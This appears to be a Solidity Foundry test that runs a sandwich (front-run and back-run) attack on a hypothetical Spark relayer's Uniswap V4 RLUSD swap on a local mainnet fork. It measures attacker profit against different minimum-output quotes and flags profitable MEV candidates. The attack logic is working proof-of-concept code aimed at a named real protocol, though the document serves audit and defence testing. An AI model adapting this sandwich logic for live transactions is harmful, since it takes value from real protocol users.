// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

// PASSO 358: tests MINIMUM-OUT sensitivity against REAL historical Spark RLUSD inventory.
// Attacker's capital is synthetic on a pinned local fork; no live transactions or broadcasts.
// Inherits Pass 357 real-balance guards and test setup.
import "./SparkFundedSwapSandwich.t.sol";

contract SparkFundedQuoteDefense is SparkFundedSwapSandwich {

    function quotedScenario(
        uint128 victimAmount,
        uint128 frontAmount,
        uint128 victimAmountOutMin
    )
        external
        returns (int256 attackerPnlMicro, uint256 victimReceived, uint256 swapGasEstimate)
    {
        require(msg.sender == address(this), "self only");

        uint256 attackerRLUSDBefore = _balance(RLUSD, ATTACKER);
        uint256 attackerUSDSBefore  = _balance(USDS, ATTACKER);

        // Attacker only manipulates the public Uniswap V4 pool.
        uint256 gasStart = gasleft();
        uint256 receivedFromFront = _swapPublic(RLUSD, frontAmount);
        uint256 frontGas = gasStart - gasleft();

        // Legitimate Spark relayer hypothetical transaction, tested ONLY on fork.
        uint256 proxyUSDSBefore = _balance(USDS, PROXY);
        vm.prank(RELAYER);
        IFSMainnetController(CONTROLLER).swapUniswapV4(
            POOL, RLUSD, victimAmount, victimAmountOutMin
        );
        victimReceived = _balance(USDS, PROXY) - proxyUSDSBefore;

        require(receivedFromFront <= type(uint128).max, "reverse exceeds uint128");

        uint256 gasBack = gasleft();
        _swapPublic(USDS, uint128(receivedFromFront));
        uint256 backGas = gasBack - gasleft();

        swapGasEstimate = frontGas + backGas;
        int256 netTokenValue18 =
            (int256(_balance(RLUSD, ATTACKER)) - int256(attackerRLUSDBefore))
          + (int256(_balance(USDS, ATTACKER)) - int256(attackerUSDSBefore));

        attackerPnlMicro = netTokenValue18 / 1e12;
    }

    function testRealSparkQuotedMinOutDefense() public {
        console2.log("=== PASSO 358: REAL BALANCE + QUOTED MINIMUM OUTPUT ===");
        console2.log("Pinned Ethereum mainnet block", block.number);
        console2.log("RLUSD balance held by Spark (18 decimals)", _balance(RLUSD, PROXY));
        console2.log("No synthetic tokens given to ALMProxy");

        // First dimension: real-inventory hypothetic victim swap sizes.
        uint256[2] memory victims = [uint256(1_000_000), 5_000_000];
        // Attacker uses independent synthetic money, never RELAYER permission.
        uint256[5] memory fronts = [
            uint256(10_000), 50_000, 200_000, 1_000_000, 3_000_000
        ];
        // AmountOutMin relative to baseline quote, NOT the 99.9% parity floor.
        uint256[3] memory numerators = [uint256(9999), 99999, 999999];
        uint256[3] memory denominators = [uint256(10000), 100000, 1000000];
        uint256 successes;
        uint256 reversions;
        uint256 profitable;

        for (uint256 i; i < victims.length; ++i) {
            uint128 victim = uint128(victims[i] * 1e18);
            uint256 snapBaseline = vm.snapshotState();
            uint256 baselineReceived;
            try this.baseline(victim) returns (uint256 received) {
                baselineReceived = received;
            } catch {
                vm.revertToState(snapBaseline);
                console2.log("BASELINE FAILED for victim size", victims[i]);
                continue;
            }
            vm.revertToState(snapBaseline);

            console2.log("--- Victim amount RLUSD", victims[i]);
            console2.log("Baseline USDS output (microUSD)", baselineReceived / 1e12);

            for (uint256 q; q < numerators.length; ++q) {
                // 99.99%, 99.999%, or 99.9999% of a deterministic baseline quote.
                uint128 quoteMinOut = uint128(
                    baselineReceived * numerators[q] / denominators[q]
                );
                console2.log("QUOTE_MIN numerator", numerators[q]);
                console2.log("QUOTE_MIN denominator", denominators[q]);
                console2.log("Quote minimum (microUSDS)", uint256(quoteMinOut) / 1e12);

                for (uint256 j; j < fronts.length; ++j) {
                    uint128 front = uint128(fronts[j] * 1e18);
                    uint256 snap = vm.snapshotState();
                    try this.quotedScenario(victim, front, quoteMinOut) returns (
                        int256 attackerPnl, uint256 actualReceived, uint256 gasUsed
                    ) {
                        ++successes;
                        int256 victimLoss = int256(baselineReceived) - int256(actualReceived);
                        console2.log("Front amount RLUSD", fronts[j]);
                        console2.log("STATUS EXECUTED");
                        console2.log("Attacker gross PnL microUSD", attackerPnl);
                        console2.log("Spark output shortfall microUSDS", victimLoss / 1e12);
                        console2.log("Attacker swap-only gas estimate", gasUsed);
                        if (attackerPnl > 0 && victimLoss > 0) {
                            ++profitable;
                            console2.log("GROSS MEV CANDIDATE; original transaction STILL unconfirmed");
                        }
                    } catch Error(string memory reason) {
                        ++reversions;
                        console2.log("Front amount RLUSD", fronts[j]);
                        console2.log("STATUS REVERTED", reason);
                    } catch {
                        ++reversions;
                        console2.log("Front amount RLUSD", fronts[j]);
                        console2.log("STATUS REVERTED opaque");
                    }
                    vm.revertToState(snap);
                }
            }
        }
        console2.log("Total quoted-minimum scenarios executed", successes);
        console2.log("Total quoted-minimum scenarios reverted", reversions);
        console2.log("Gross positive scenarios executed", profitable);
        console2.log("Results are before gas and rely on a HYPOTHETICAL relayer trade.");
        console2.log("NO BROADCAST. LOCAL FORK ONLY.");
    }
}
